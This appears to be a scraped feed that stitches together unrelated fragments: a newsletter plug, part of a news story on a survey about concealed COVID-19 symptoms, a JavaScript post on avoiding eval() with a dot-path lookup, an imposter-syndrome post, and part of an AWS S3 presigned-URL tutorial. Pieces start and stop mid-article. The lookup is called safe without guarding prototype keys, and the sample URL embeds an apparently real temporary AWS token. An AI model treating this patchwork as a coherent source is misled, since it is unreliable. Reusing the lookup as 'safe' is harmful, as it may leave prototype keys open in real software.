<div><p><strong>The end product speaks for itself.</strong> If you can’t deliver it or what is shipped doesn’t provide direct value then start over or re-work. Much like an artist would paint over the canvas or toss it away – there is no value (only risk) in maintaining meaningless software.&nbsp; Attachment to sunk cost, “technology” hording, and pet projects are guaranteed ways to fail or prolong the achievement of goals.</p><p><strong>If you want to improve your ability to contribute to and drive the delivery of meaningful software</strong> I’d encourage you to follow along on this journey – <a href="https://7samurai.dev/weekly-newsletter/">sign up for my weekly newsletter</a>.</p></div>

Thirty-four per cent of people with the virus had&nbsp;denied having symptoms when others asked, and 55 per cent&nbsp;said they'd concealed their symptoms on some level.</p>  <p>And a quarter of all respondents&nbsp;said they lied about how much they were following health protocols.

"It reminds us that these numbers and the data are dependent&nbsp;on people telling the truth."</p>  <p>O'Connor says in some cases, people who concealed symptoms were afraid of stigma and social judgment, especially if they didn't follow public health guidelines. People who'd concealed symptoms were also less judgmental of other people doing the same.</p>  <p>O'Connor says this shows that shaming people and creating a stigma&nbsp;results in less reliable public health data.</p>  <p>"It's important to not necessarily blame people who are concealing this information, but to understand the barriers that are there from preventing them from telling the truth."</p>  <p>The team conducted the surveys through Amazon in late April and early May. That's why the respondents were American, O'Connor said. The team is interested in doing a similar survey in Canada, although O'Connor said work through Evans's&nbsp;<a href="http://www.brockscdlab.com/" rel="noopener noreferrer" target="_blank">Social and Cognitive Development Lab</a>&nbsp;shows the results would likely be similar.</p>  <p>That's true even in taking into account how politically charged the pandemic is in the U.S. O'Connor said she "can't rule out" that the political climate influenced the results, but there's no way to know for sure.</p>  <p>In every country, she said, "lying is a common social behaviour."</p>  <p>The research was published on Aug. 17 in the <em>Journal of Health Psychology</em>.&nbsp;</p>  <p>Here are some other highlights:</p>  <ul>   <li>53 per cent of participants with COVID-19 denied needing to quarantine when asked by others.</li>   <li>Females were more likely than males to readily disclose&nbsp;health symptoms.</li>   <li>Older adults and those who were more community oriented, gauged by their scores on the Communal Orientation Scale, were&nbsp;more honest&nbsp;about their COVID-19 status and behaviours.</li>   <li>Most of the participants had a post-secondary education.</li>  </ul>  <p>Evans says the results show that campaigns should focus&nbsp;on everyone being in this together.</p>  <p>"If we aren't honest about our symptoms and our social distancing behaviours, it will be difficult&nbsp;to keep COVID-19 positive numbers low until we find a vaccine," Evans said.</p>  <p>"Our honesty will help public health with contact tracing, reduce others' risks of interacting with us if we may be at risk, and in turn benefit society as a whole."</p></span></p></div></div>]]>

<![CDATA[Safe eval() Alternative in JavaScript]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">
            

            <div id="container">


<div>
    <article itemscope="" itemtype="http://schema.org/BlogPosting">
        

        <div itemprop="articleBody">
    

    <p>A problem I encountered while creating <a href="https://discordbotstudio.org/">Discord Bot Studio</a>, was allowing users to enter variables which could be evaluated at runtime. Discord Bot Studio is a visual programming tool, so I felt it was important to offer a familiar variable syntax. Ideally, I wanted a user to be able to type a variable using the following notation, and have it be replaced with that variable’s value at runtime:</p>
<p>An example would be if I have an object as follows:</p>
<div><pre><code data-lang="javascript"><span>variableObject</span> {
    <span>variableName</span><span>:</span> {
        <span>fieldName</span><span>:</span> <span>"Austin"</span>
    }
}
</code></pre></div><p>The user should be able to retrieve that value “Austin” with the following syntax:</p>
<div><pre><code data-lang="javascript"><span>$</span>{<span>variableObject</span>.<span>variableName</span>.<span>fieldName</span>}
</code></pre></div><p>Rmember, this is a visual programming tool, so there could be any number of variables in an input string, or there could be none at all. The input is being evaluated at runtime, as it can be dynamic.</p>
<p>The seemingly obvious solution is to use Javascript’s <code>eval()</code> function, to evaluate the variables at runtime. Since DBS creates bots which will eventually be taking untrusted user input, this is not safe to do. Rather than trying to clean any incoming input, I settled on another solution which still allows variables with the dot (.) syntax to be evaluated.</p>
<h2 id="the-solution">The solution</h2>
<p>First I match variables in the input string using regex by looking for the ${} notation I mentioned above.</p>
<p>I trim the excess ${} from the match, and pass the resultant string to the following function, along with the object containing any variables that may be referenced by the user.</p>
<div><pre><code data-lang="javascript"><span>// desc = variableObject.variableName.fieldName
</span><span></span><span>/* obj = userVariables {
</span><span>    variableObject {
</span><span>        variableName: {
</span><span>            fieldName: "Austin"
</span><span>        }
</span><span>    }
</span><span>}
</span><span>*/</span>
<span>function</span> <span>getDescendantProp</span>(<span>obj</span>, <span>desc</span>) {
    <span>var</span> <span>arr</span> <span>=</span> <span>desc</span>.<span>split</span>(<span>"."</span>);

    <span>while</span> (<span>arr</span>.<span>length</span>) {
        <span>obj</span> <span>=</span> <span>obj</span>[<span>arr</span>.<span>shift</span>()];
    }
    <span>return</span> <span>obj</span>;
}
</code></pre></div><p>Here obj is the object containing any variables the user input should have access to. Desc is the trimmed match string. Continuing the example from above, desc would equal <code>variableObject.variableName.fieldName</code>. The string is split into an array on the periods.  <code>variableObject.variableName.fieldName</code> would be split into 
<code>[variableObject, variableName, fieldName]</code>. These array values are then shifted out in order, and used as keys to access the variable-containing object. This function will return just the string “Austin” using the example object from above.</p>
<p>By doing this, I can limit the variables that are available to the user, and also give them access to those variables using normal Javascript syntax. This can be extended if you would like to support <code>variableObject[variableName]</code> as well. This is not a true alternative to <code>eval()</code> for all scenarios, but it works well for indexing into objects at runtime.</p>

<![CDATA[Avoiding Imposter Syndrome Driven Development]]>

<p>If you’re taking your first steps into development you may have a nagging feeling like you don’t belong. Or that you’re failing because you don’t know ‘enough’ in your chosen field. You’re not alone. </p>



<p>Here’s how to recognise what you’re feeling, that it’s normal, and some strategies to feel better.</p>



<hr>



<h3>You don’t need to know everything, about everything</h3>



<p>You may be overthinking small mistakes. Feeling lost in meetings because there are terms and tools you’ve not heard before. Maybe you feel guilty for having to reluctantly ask for help after spending time googling, knowing that it must be something simple. And to make it worse, feeling like you’re falling farther and farther behind as the tech world moves on.</p>



<p>There is so much to learn about how things work in tech now, and things are constantly changing. Instead of comparing yourself to the seniors on your team use it as motivation to learn more from those around you.</p>



<hr>



<h3>Not every request is an emergency</h3>



<p>Even if you don’t have deadlines to meet, facing your team’s ticket queue or backlog of projects can seem overwhelming. You may not be managing the workflow but watching them piling up is stressful. You know you can’t whizz through and get everything ticked off in a day because you don’t have all the answers. </p>



<p>Even though the ticket is assigned to you, it’s not completely up to you to complete it. Your team are there to help you with a code review at the very least, but in most teams, it’s a collaborative effort and not all tasks are an emergency.</p>



<hr>



<h3>Leave work at work</h3>



<p>You may not realise it but it’s easy to let anxious feelings about work follow you home.  On your walk to work, walking home, even sitting on the couch after dinner. You may even fall into bed thinking about work, even if nothing bad has happened. Take time to disconnect from your work-life each day and do something else that refreshes your mind and makes you happy. Leaving work at work and focussing on all the other great things you have going on will keep things in perspective.</p>



<hr>



<h3>Remember the good stuff</h3>



<p>All too often we put pressure on ourselves to learn the next new thing on our wishlist of tools and technologies. But how often do you celebrate what you’ve learned so far?</p>



<p>Start a list of all the new things you’ve learned and&nbsp;the <a href="https://helenanderson.co.nz/big-data-a-to-z/" target="_blank" rel="noreferrer noopener">technologies</a>&nbsp;you’re using. When you put that on paper it reminds you that you are capable of learning new tools and how far you’ve come. </p>



<hr>



<h3>You’re doing great</h3>



<p>At some stage, everyone feels a little like an imposter. But you don’t need to be overwhelmed by it.  When you feel overwhelmed know you can talk to your manager and your team. They’ve been right where you are too, and may still feel like an imposter sometimes themselves. </p>



<p>The important thing is to give yourself a break, you’re doing great.</p>

Today in this post we see how you can achieve this for your website using Amazon Web Services. We will see how you can securely serve private content to your users from AWS S3 bucket using S3 Presigned URLs</p>
<h3 id="what-are-presigned-urls">What are Presigned URLs?</h3>
<p>A <strong>Presigned URL</strong> is a <strong>URL</strong> that provides limited permission and time to make a request. Anyone who receives the presigned URL can then access the object. For example, if you have a file in your bucket and both the bucket and the object are private, you can share the file with others by generating a presigned URL. </p>
<h4 id="some-important-points-on-presigned-urls">Some important points on Presigned URLs</h4>
<ul>
<li>The creator of Presigned URL should have access to object for URL to work, otherwise URL wont work.</li>
<li>You can create a presigned URL that's are not usable or doesn’t work. </li>
<li>It doesn’t cost anything to create Presigned URLs.</li>
<li>You can set expiration time on the URLs </li>
<li>If you created a presigned URL using a temporary token, then the URL expires when the token expires, even if the URL was created with a later expiration time</li>
<li>You can revoke the URL by removing the permissions to access the object from the user created the URL.</li>
</ul>
<h3 id="how-to-create-presigned-url">How to create Presigned URL?</h3>
<p>When you create a presigned URL for your object, you must provide your security credentials, specify a bucket name, an object key, specify method and expiration time.</p>
<p>In Python, using Boto3, you can use <em>generate_presigned_url</em> method to generate the URL</p>
<pre><code>response = s3_client.generate_presigned_url(<span>'get_object'</span>,
            Params={<span>'Bucket'</span>: bucket_name,
            <span>'Key'</span>: object_name},
            ExpiresIn=expiration)
</code></pre><p>The <em>response</em> object will contain the URL which will look similar to this</p>
<pre><code><span>https</span>://somebucketname-rep.s3.amazonaws.com/someFileName.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQS3IOUWUZF7YSXGA<span>%2</span>F20200821<span>%2</span>Fus-east-2<span>%2</span>Fs3<span>%2</span>Faws4_request&amp;X-Amz-Date=20200821T051228Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Security-Token=FwoGZXIvYXdzEH8aDCfJDxO0y6xQxYmdGCK2AXe71W<span>%2</span>FgZEg<span>%2</span>FSnSWC<span>%2</span>Fw<span>%2</span>FaJHeZ20M7OI7AqMEum5c98Chl6pSNPwE5Awsc3ySwokDF6L8a9wP0ceXWAmxT3WXLSoFeNHDbbEHfUKWnvGL8yFzAxdmf<span>%2</span>Fmi<span>%2</span>B5Tnl62td8Nad<span>%2</span>F0Ct1Sx11Mip1h2qdYxw80OX5bCTq7cAHHjpmupvaDt<span>%2</span>BZ3qVyIA9WZmeS63dCPOlieE9IiBZf<span>%2</span>FjxF4Mcs5w4ZIHtZL<span>%2</span>F3LvqMXAy3XfzCgnlYVZeCNczKLuv<span>%2</span>FfkFMi0mStwkzyO<span>%2</span>BfMIxWJ82GJmyNi7LZuY5r0Hx0mE<span>%2</span>BxLnre8jp9<span>%2</span>FACoV<span>%2</span>FM92GnsR0<span>%3</span>D&amp;X-Amz-Signature=17046b630ad4dede85af1cd57204bba8adc462a1825a35d93e81b656c683ad75
</code></pre><p>You can use this URL in the browser and access the object! Simple.. isn't it?</p>
<h3 id="lets-see-it-in-action">Lets see it in Action</h3>
<p>We are going to implement this on top of previous two posts, <a target="_blank" href="https://blog.rajanpanchal.net/aws-kms-use-case-with-serverless-application-model-sam-an-end-to-end-solution-ckdfenqag00lsqqs1csp05vhj">in the first post</a>, we implemented custom identity broker(signup/login), using AWS KMS to encrypt decryt password. In <a target="_blank" href="https://blog.rajanpanchal.net/how-to-give-access-to-aws-resources-without-creating-100s-of-iam-users-ckds91qj100pf97s1gc3v8vwb">second post</a>, we used AWS STS to AssumeRole to read bucket files names and now we will extend that to use presigned url. Download code for second post from <a href="http://github.com/rajanpanchal/aws-kms-sts" target="_blank">github.com/rajanpanchal/aws-kms-sts</a> and modify it.
Here is how overall process looks like
<img src="https://s3.amazonaws.com/blog-images-rajanpanchal.net/presignedUrl/presignedurl_diagram.jpg" alt="free cloud storage on s3, presigned URL diagram"></p>
<p>Open file <a href="http://showfiles.py/" target="_blank">showFiles.py</a> from the Lamdba folder and lets add function to generate presigned URL. Call this function from <em>getFilesList</em> function.</p>
<pre><code><span><span>def</span> <span>getSignedUrl</span><span>(key,s3_client)</span>:</span>
    KeyUrl = {}

    response = s3_client.generate_presigned_url(<span>'get_object'</span>,
                        Params={<span>'Bucket'</span>: os.environ[<span>'filesBucket'</span>],
                        <span>'Key'</span>: key},
                        ExpiresIn=<span>3600</span>)
    KeyUrl[key] = response
    <span>return</span> KeyUrl



<span><span>def</span> <span>getFilesList</span><span>()</span>:</span>
    sts_client = boto3.client(<span>'sts'</span>)

    
    
    assumed_role_object=sts_client.assume_role(
        RoleArn=os.environ[<span>'s3role'</span>],
        RoleSessionName=<span>"AssumeRoleSession1"</span>
    )

    
    
    credentials=assumed_role_object[<span>'Credentials'</span>]

    
    
    s3_resource=boto3.resource(
        <span>'s3'</span>,
        aws_access_key_id=credentials[<span>'AccessKeyId'</span>],
        aws_secret_access_key=credentials[<span>'SecretAccessKey'</span>],
        aws_session_token=credentials[<span>'SessionToken'</span>],
    )
    s3_client = boto3.client(<span>'s3'</span>,aws_access_key_id=credentials[<span>'AccessKeyId'</span>],
aws_secret_access_key=credentials[<span>'SecretAccessKey'</span>],
aws_session_token=credentials[<span>'SessionToken'</span>])
    bucket = s3_resource.Bucket(os.environ[<span>'filesBucket'</span>])
    files=[]
    <span>for</span> obj <span>in</span> bucket.objects.all():
        files.append(getSignedUrl(obj.key,s3_client))
    <span>return</span> files
</code></pre>
<p>We are using the temporary credentials obtained from <em>AssumeRole</em> to generate Presigned URL in <em>getSignedUrl</em> function. The <em>getFilesList</em> functions returns list of file names and presigned URL.</p>
<p>Now, modify showFiles.html, to iterate over response and create links for files</p>

<p>Modify login.html, signup.html and showFiles.html to update the api urls from cloudformation outputs.
Upload these files to the bucket <em>stsexamplebucket</em> or the bucket you created. Keep these files Public</p>
